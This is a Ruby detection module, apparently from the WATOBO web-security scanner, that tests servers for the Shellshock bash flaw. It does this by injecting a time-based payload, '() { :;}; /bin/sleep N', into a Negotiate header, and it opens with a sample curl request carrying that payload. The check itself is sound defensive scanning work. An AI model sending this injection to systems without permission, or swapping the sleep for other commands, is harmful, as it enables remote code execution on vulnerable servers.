=begin
$ curl -i -H "Negotiate: () { :; }; /bin/sleep 3" http://192.168.70.134/cgi-bin/shock.cgi
HTTP/1.1 500 Internal Server Error
Date: Fri, 24 Jan 2014 08:50:10 GMT
Server: Apache/2.2.22 (Debian)
Vary: Accept-Encoding
Content-Length: 619
Connection: close
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>500 Internal Server Error</title>
</head><body>
<h1>Internal Server Error</h1>
<p>The server encountered an internal error or
misconfiguration and was unable to complete
your request.</p>
<p>Please contact the server administrator,
 webmaster@localhost and inform them of the time the error occurred,
and anything you might have done that may have
caused the error.</p>
<p>More information about this error may be available
in the server error log.</p>
<hr>
<address>Apache/2.2.22 (Debian) Server at 192.168.70.134 Port 80</address>
</body></html>
  
=end

module Watobo #:nodoc: all
  module Modules
    module Active
      module Shell_shock


        class Shell_shock < Watobo::ActiveCheck
          @info.update(
              :check_name => 'ShellShock', # name of check which briefly describes functionality, will be used for tree and progress views
              :check_group => AC_GROUP_GENERIC,
              :description => "", # description of checkfunction
              :author => "Andreas Schmidt", # author of check
              :version => "0.9" # check version
          )

          threat = <<'EOF'
            Really bad, bad things can happen! 
EOF

          measure = "Patch it!"

          @finding.update(
              :threat => threat, # thread of vulnerability, e.g. loss of information
              :class => "ShellShock (RCE)", # vulnerability class, e.g. Stored XSS, SQL-Injection, ...
              :type => FINDING_TYPE_VULN, # FINDING_TYPE_HINT, FINDING_TYPE_INFO, FINDING_TYPE_VULN
              :rating => VULN_RATING_CRITICAL,
              :measure => measure
          )


          def initialize(project, prefs = {})
            super(project, prefs)

          end

          def generateChecks(chat)

            checker = proc {
              test_request = nil
              test_response = nil
              output = ""

              rtimes = []

              timing_response = nil

              3.times do
                test = chat.copyRequest
                start = Time.now().to_i
                timing_request, timing_response = doRequest(test, :default => true)
                stop = Time.now().to_i
                rtimes << (stop - start)
              end
              # now calculate the average time
              t_average = rtimes.inject(:+) / rtimes.length
              t_average = 1 if t_average == 0

              time_to_sleep = rtimes.max > (2 * t_average) ? rtimes.max : (2 * t_average)

              timeout_counter = 0
              t_start = Time.now().to_i

              request = chat.copyRequest
              request.addHeader("Negotiate", "() { :;}; /bin/sleep #{time_to_sleep}")

              test_request, test_response = doRequest(request, :default => true)

              t_stop = Time.now.to_i
              timeout_counter += 1

              duration = t_stop - t_start
              #  puts duration
              if (duration >= time_to_sleep)
                puts "Found ShellShock Vulnerablitiy !!!"
                puts "after #{duration}s / time-to-sleep #{time_to_sleep}s)"

                test_request.extend Watobo::Mixin::Parser::Url unless test_request.respond_to? :path

                path = "/" + test_request.path

                output << "SleepTime: #{time_to_sleep}\nQuery Duration: #{duration}s"

                addFinding(test_request, test_response,
                           :check_pattern => "Negotiate.*sleep \d",
                           :chat => chat,
                           :title => "[Timing] - #{path}",
                           :proof_pattern => "",
                           :test_item => "Negotiate",
                           :class => "ShellShock (Time-based)",
                           :output => output
                )

              end


              [test_request, test_response]
            }
            yield checker


          end
        end

        # --> eo namespace    
      end
    end
  end
end
